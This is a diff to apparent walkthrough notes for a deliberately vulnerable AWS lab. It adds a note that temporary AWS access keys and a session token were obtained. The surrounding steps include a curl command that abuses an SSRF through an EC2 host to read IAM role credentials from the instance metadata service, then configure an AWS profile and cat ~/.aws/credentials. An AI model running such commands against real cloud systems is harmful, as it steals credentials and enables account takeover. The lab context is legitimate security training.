@@ -6,6 +6,11 @@ cg-banking-WAF-Role-cgid2odf2492zi
 
 2. curl http://<ec2_external_IP>/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgid2odf2492zi -H 'Host:169.254.169.254'
 
+Got temporary
+aws_access_key_id 
+aws_secret_access_key
+aws_session_token
+
 3. aws configure --profile erratic
 
 cat ~/.aws/credentials 
